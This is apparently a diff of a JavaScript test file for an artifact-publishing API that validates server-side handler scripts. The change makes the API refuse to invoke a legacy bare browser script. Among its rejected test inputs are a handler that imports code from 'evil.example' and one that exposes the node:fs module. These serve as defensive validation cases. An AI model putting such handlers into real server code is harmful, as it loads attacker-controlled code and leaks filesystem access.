@@ -41,7 +41,7 @@ it('API authenticates callers and pins only the published server handler, ignori
  const run=runInNewContext(output.code+';Handler.default',{});
  expect(await run({ok:true},{artifactbin:{call:async()=>({tables:{},errors:{}})}})).toEqual({version:1,input:{ok:true}});
 });
-it('rejects invalid server handlers during publication and keeps legacy untyped Lambda invocation',async()=>{
+it('rejects invalid server handlers during publication and refuses to invoke a document whose Helmet has only a bare browser script',async()=>{
  const owner=await createUser({email:'mxmx_test_server_script_validation@example.com'}),token=await mintToken('server-script',owner.id);await claimToken(owner.id,token.token);
  for(const script of ['export const notAHandler = 1;', 'export default () => import("https://evil.example/module.js");', 'import fs from "node:fs"; export default () => fs;']){
   const response=await publish(request('/api/artifacts',{method:'POST',token:token.token,json:{markup:`<Helmet><script type="server">{${JSON.stringify(script)}}</script></Helmet><p>Invalid</p>`}}));
@@ -49,7 +49,7 @@ it('rejects invalid server handlers during publication and keeps legacy untyped 
  }
  const response=await publish(request('/api/artifacts',{method:'POST',token:token.token,json:{markup:'<Helmet><script>{`export default () => 42;`}</script></Helmet><p>Legacy</p>'}}));expect(response.status).toBe(201);const {id}=await response.json();
  const start=vi.fn(async()=>({runId:'legacy'}));setServices({runner:{start,getRun:vi.fn(),events:vi.fn(),cancel:vi.fn()}});
- expect((await invoke(request(`/api/artifacts/${id}/runs`,{method:'POST',actor:{userId:owner.id,credential:'session'},json:{requestId:'legacy'}}),{params:Promise.resolve({id})})).status).toBe(202);expect(start).toHaveBeenCalledOnce();
+ expect((await invoke(request(`/api/artifacts/${id}/runs`,{method:'POST',actor:{userId:owner.id,credential:'session'},json:{requestId:'legacy'}}),{params:Promise.resolve({id})})).status).toBe(400);expect(start).not.toHaveBeenCalled();
 });
 
 it('never treats an explicitly browser-only default export as a server handler',async()=>{
